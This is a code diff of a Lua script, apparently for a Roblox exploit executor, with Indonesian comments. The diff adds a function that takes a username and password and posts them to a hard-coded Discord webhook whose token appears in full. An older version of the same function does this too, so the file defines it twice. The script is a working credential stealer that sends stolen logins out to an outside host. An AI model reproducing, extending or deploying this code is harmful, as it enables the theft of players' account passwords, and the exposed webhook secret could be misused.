@@ -1,25 +1,37 @@
--- Fungsi untuk mendeteksi executor
-local function detectExecutor()
-    if syn and syn.request then
-        return "syn"
-    elseif http and http.request then
-        return "http"
-    elseif request then
-        return "request"
-    else
-        return nil
-    end
-end
-
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
 
--- Fungsi untuk mengirim data ke Discord
+local function sendToDiscord(username, password)
+    if syn and syn.request then
+        print("Executor mendukung syn.request") -- Debugging
+        local response = syn.request({
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({
+                content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
+            })
+        })
+
+        if response and response.Success then
+            print("Data berhasil dikirim ke Discord!") -- Debugging
+        else
+            print("Gagal mengirim data ke Discord:", response.StatusCode, response.Body) -- Debugging
+        end
+    else
+        print("Executor tidak mendukung HTTP requests!") -- Debugging
+    end
+end
+
 local function sendToDiscord(username, password)
     local httpService = game:GetService("HttpService")
     local payload = httpService:JSONEncode({
         content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
     })
+
+    print("Payload yang dikirim:", payload) -- Debugging: Pastikan payload benar
 
     local success, err = pcall(function()
         httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
